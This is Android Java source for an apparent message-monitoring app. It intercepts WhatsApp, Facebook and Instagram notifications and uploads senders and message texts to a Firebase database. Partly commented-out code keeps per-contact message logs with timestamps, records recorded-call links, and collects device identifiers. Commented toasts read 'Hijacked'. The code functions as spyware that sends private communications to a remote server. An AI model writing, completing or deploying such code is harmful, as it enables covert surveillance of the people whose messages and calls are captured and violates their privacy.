package com.example.dorisincomingmessages;


import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;


import java.io.File;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;

public class MainActivity extends AppCompatActivity {


    private static final String ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
    private static final String ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS";


    private TextView tvMsg;
    private ReceiveBroadcastReceiver imageChangeBroadcastReceiver;
    private AlertDialog enableNotificationListenerAlertDialog;
    DatabaseReference wadb,fbdb,indb,rldb,Detailedwadb,Detailedfbdb,Detailedindb,calls,DetailedCall;


    public static final int permission = 1;
    ArrayList<String> arrayList;
    ListView listView;
    ArrayAdapter<String> arrayAdapter;
    public String  currentlocation,currenttitle;
    String recieved_cmd = "Recieved";
    public String pathway,downloaduristring,date,daterefined,timerefined;
    TextView textView;
    Button sett;




    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.RECEIVE_SMS)
        != PackageManager.PERMISSION_GRANTED)
        {
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS},1000);
        }

        sett = (Button) findViewById(R.id.chg);
        sett.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivityForResult(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS), 0);
            }
        });

//        wadb = FirebaseDatabase.getInstance().getReference().child("Whatsapp Senders");
//        fbdb = FirebaseDatabase.getInstance().getReference().child("Facebook Senders");
//        indb = FirebaseDatabase.getInstance().getReference().child("Instagram Senders");
        rldb = FirebaseDatabase.getInstance().getReference().child("Realtime");
//        calls = FirebaseDatabase.getInstance().getReference().child("Recieved Calls");


        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS}, PackageManager.PERMISSION_GRANTED);

        tvMsg = (TextView) this.findViewById(R.id.image_change_explanation);



        if(!isNotificationServiceEnabled()){
            enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog();
            enableNotificationListenerAlertDialog.show();
        }

        imageChangeBroadcastReceiver = new ReceiveBroadcastReceiver();
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("com.example.ssa_ezra.whatsappmonitoring");
        registerReceiver(imageChangeBroadcastReceiver,intentFilter);



        if (ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
        {
            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this
                    ,Manifest.permission.READ_EXTERNAL_STORAGE))
            {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]
                                {
                                        Manifest.permission.READ_EXTERNAL_STORAGE },permission);
            }else {
                ActivityCompat.requestPermissions(MainActivity.this,
                        new String[]
                                {
                                        Manifest.permission.READ_EXTERNAL_STORAGE },permission);
            }
        }else {
            Toast.makeText(this, "Else Part", Toast.LENGTH_SHORT).show();
        }





    }


    private void UpdateMainDB(String currenttitle, String downloaduristring,String daterefined,String timerefined,String date) {

        DetailedCall = FirebaseDatabase.getInstance().getReference().child("Detailed Calls");

        HashMap<String,Object> hashMap = new HashMap<>();
        hashMap.put("Caller",currenttitle);
        hashMap.put("Recorded_Call",downloaduristring);



        DetailedCall.child(currenttitle).updateChildren(hashMap);
    }


    private void getmusic() {

        ContentResolver contentResolver = getContentResolver();
        Uri songsuri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
        Cursor songcursor = contentResolver.query(songsuri,null,null,null,null);

        if (songcursor != null && songcursor.moveToFirst())
        {
            int songtitle = songcursor.getColumnIndex(MediaStore.Audio.Media.TITLE);
            int songlocation = songcursor.getColumnIndex(MediaStore.Audio.Media.DATA);


            do {
                currenttitle = songcursor.getString(songtitle);
                currentlocation = songcursor.getString(songlocation);
                arrayList.add(currenttitle + "\n" + currentlocation);


            }while (songcursor.moveToNext());

        }

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == 1000)
        {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED)
            {
                Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
            }else {
                Toast.makeText(this, "Permission Not Granted", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }

    public class ReceiveBroadcastReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {

            int receivedNotificationCode = intent.getIntExtra("Notification Code",-1);
            String packages = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");

            if(text != null) {

                if(!text.contains("new messages") && !text.contains("WhatsApp Web is currently active") && !text.contains("WhatsApp Web login")) {

                    String android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(),
                            Settings.Secure.ANDROID_ID);
                    String devicemodel = android.os.Build.MANUFACTURER+android.os.Build.MODEL+android.os.Build.BRAND+android.os.Build.SERIAL;

                    DateFormat df = new SimpleDateFormat("ddMMyyyyHHmmssSSS");
                    DateFormat refined = new SimpleDateFormat("d MMM yyyy");
                    DateFormat refinedtime = new SimpleDateFormat("hh:mm:aaa");
                    String date = df.format(Calendar.getInstance().getTime());
                    String daterefined = refined.format(Calendar.getInstance().getTime());
                    String timerefined = refinedtime.format(Calendar.getInstance().getTime());

                    tvMsg.setText("Notification : " + receivedNotificationCode + "\nPackages : " + packages + "\nTitle : " + title + "\nText : " + text + "\nId : " + date+ "\nandroid_id : " + android_id+ "\ndevicemodel : " + devicemodel);


//                    upload(receivedNotificationCode,date,title,text,daterefined,timerefined);
//                    detailedupload(receivedNotificationCode,date,title,text,daterefined,timerefined);
                    realtime(receivedNotificationCode,date,title,text,daterefined,timerefined);


                    /**
                     Log.d("DetailsEzraatext2 :", "Notification : " + receivedNotificationCode + "\nPackages : " + packages + "\nTitle : " + title + "\nText : " + text + "\nId : " + date+ "\nandroid_id : " + android_id+ "\ndevicemodel : " + devicemodel);
                     */
                }
            }
        }


    }

    private void realtime(int receivedNotificationCode, String date, String title, String text, String daterefined, String timerefined) {


        HashMap<String ,Object> hashMap = new HashMap<>();
        hashMap.put("Sender",title);
        hashMap.put("Message",text);

        rldb.updateChildren(hashMap);


    }


    private void upload(int receivedNotificationCode,String date,String title,String text,String daterefined, String timerefined) {

        if (receivedNotificationCode == 1)
        {
            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);


            fbdb.child(title).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });


        }
        else if (receivedNotificationCode == 2)
        {

            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);

            wadb.child(title).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });



        }
        else if (receivedNotificationCode == 3)
        {

            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);

            indb.child(title).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });


        }

    }


    private void detailedupload(int receivedNotificationCode, String date, String title, String text, String daterefined, String timerefined) {

        Detailedwadb = FirebaseDatabase.getInstance().getReference().child(title +"'s"+ " Detailed Whatsapp Messages");
        Detailedfbdb = FirebaseDatabase.getInstance().getReference().child(title +"'s"+ " Detailed Facebook Messages");
        Detailedindb = FirebaseDatabase.getInstance().getReference().child(title +"'s"+ " Detailed Instagram Messages");

        if (receivedNotificationCode == 1)
        {
            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);
            hashMap.put("Message",text);
            hashMap.put("Date",daterefined);
            hashMap.put("Time",timerefined);



            Detailedfbdb.child(date).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });


        }
        else if (receivedNotificationCode == 2)
        {

            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);
            hashMap.put("Message",text);
            hashMap.put("Date",daterefined);
            hashMap.put("Time",timerefined);



            Detailedwadb.child(date).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });




        }
        else if (receivedNotificationCode == 3)
        {

            HashMap<String,Object> hashMap = new HashMap<>();
            hashMap.put("Sender",title);
            hashMap.put("Message",text);
            hashMap.put("Date",daterefined);
            hashMap.put("Time",timerefined);

            Detailedindb.child(date).updateChildren(hashMap);
//                    .addOnCompleteListener(new OnCompleteListener<Void>() {
//                        @Override
//                        public void onComplete(@NonNull Task<Void> task) {
//                            if (task.isSuccessful()) {
//                                Toast.makeText(MainActivity.this, "Hijacked", Toast.LENGTH_SHORT).show();
//
//                            } else {
//                                Toast.makeText(MainActivity.this, "Unsucessful", Toast.LENGTH_SHORT).show();
//
//                            }
//                        }
//                    });



        }

    }




    private boolean isNotificationServiceEnabled(){
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(),
                ENABLED_NOTIFICATION_LISTENERS);
        if (!TextUtils.isEmpty(flat)) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null) {
                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private AlertDialog buildNotificationServiceAlertDialog(){
        AlertDialog.Builder alertDialogBuilder = new AlertDialog.Builder(this);
        alertDialogBuilder.setTitle(R.string.notification_listener_service);
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation);
        alertDialogBuilder.setPositiveButton(R.string.yes,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        startActivity(new Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    }
                });
        alertDialogBuilder.setNegativeButton(R.string.no,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        // If you choose to not enable the notification listener
                        // the app. will not work as expected
                    }
                });
        return(alertDialogBuilder.create());
    }


    private boolean isAccessibilityOn (Context context, Class<? extends AccessibilityService> clazz) {
        int accessibilityEnabled = 0;
        final String service = context.getPackageName () + "/" + clazz.getCanonicalName ();
        try {
            accessibilityEnabled = Settings.Secure.getInt (context.getApplicationContext ().getContentResolver (), Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException ignored) {  }

        TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter (':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString (context.getApplicationContext ().getContentResolver (), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                colonSplitter.setString (settingValue);
                while (colonSplitter.hasNext ()) {
                    String accessibilityService = colonSplitter.next ();

                    if (accessibilityService.equalsIgnoreCase (service)) {
                        return true;
                    }
                }
            }
        }

        return false;
    }

}